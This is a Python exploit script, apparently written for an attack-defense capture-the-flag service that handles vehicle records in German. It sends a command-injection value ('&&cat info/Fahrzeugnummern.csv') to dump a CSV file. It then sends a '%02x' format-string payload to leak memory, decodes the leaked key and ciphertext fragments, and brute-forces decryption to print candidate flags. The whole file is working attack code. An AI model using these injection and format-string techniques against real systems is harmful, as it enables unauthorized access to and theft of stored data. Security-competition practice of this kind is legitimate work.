import subprocess
import socket
import sys
import time
from Crypto.Cipher import AES
from Crypto import Random

def execute_shell(command, error=''):
    return subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)

OKBLUE  = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL    = '\033[91m'
ENDC    = '\033[0m'

ip      = sys.argv[1]
port    = int(sys.argv[2])
flagID  = sys.argv[3]
flagID1 = flagID[:6]
flagID2 = flagID[6:]

keys    = []
encr    = []


BUFFER_SIZE = 2048
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

data = ""
loop = True
while loop:
    tmp = s.recv(BUFFER_SIZE)
    if tmp.find("Fahrgsteinumma ei:") != -1: loop = False
    data += tmp

print OKBLUE + "[*] Trying to get flag part 1" + ENDC
s.send("AAVZZZ53178207512&&cat info/Fahrzeugnummern.csv&&cat info/Fahrzeugnummern.csv")

data = ""
loop = True
while loop:
    tmp = s.recv(BUFFER_SIZE)
    if tmp.find("Emmissionswert\n\n") != -1: loop = False
    data += tmp

for line in data.splitlines():
    if line.startswith(flagID1):
        keys.append(line.split(";")[1])
print OKGREEN + "[+] Found " + str(len(keys)) + " possible parts" + ENDC
#------------------------------------------------------------------------------#
print OKBLUE + "[*] Trying to get flag part 2" + ENDC
s.send("I ko koa bayrisch")
data = s.recv(BUFFER_SIZE)
data += s.recv(BUFFER_SIZE)
bayWord = "ASDASD"
s.send(bayWord + "%02x"*100 + bayWord)

data = ""
loop = True
while loop:
    tmp = s.recv(BUFFER_SIZE)
    if tmp.find("deutsch.\n") != -1: loop = False
    data += tmp

entries =  data.splitlines()[1].split("ASDASD")[1].split("32343234")
entries.remove(entries[0])

chunks, chunk_size = len(entries[0]), 2#len(entries[0])//4
tmp = []

for ent in entries:
    tmp2 = [ ent[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
    tmp.append(tmp2)

lines = []
for elem in tmp:
    tmp2 = ""
    for c in elem:
        try:
            tmp2 = chr(int(c, 16)) + tmp2
        except ValueError:
            pass
    lines.append(tmp2)

for line in lines:
    if line.startswith(flagID2):
        encr.append(line.split(";")[1][:-1])

print OKGREEN + "[+] Found " + str(len(encr)) + " possible parts" + ENDC

print(keys)
print(encr)

s.send("exit")
data = s.recv(BUFFER_SIZE)
for key in keys:
    for en in encr:
        s.send("decrypt")
        data = s.recv(BUFFER_SIZE)
        data = s.recv(BUFFER_SIZE)
        s.send(key + " " + en)
        data = s.recv(BUFFER_SIZE)
        if data.startswith("gcry_cipher_decrypt failed:"):
            print FAIL + "[-] Found false flag"+ data + ENDC
        else:
            print OKGREEN + "[+] Possible Flag: " + data + ENDC

s.close()
sys.exit()
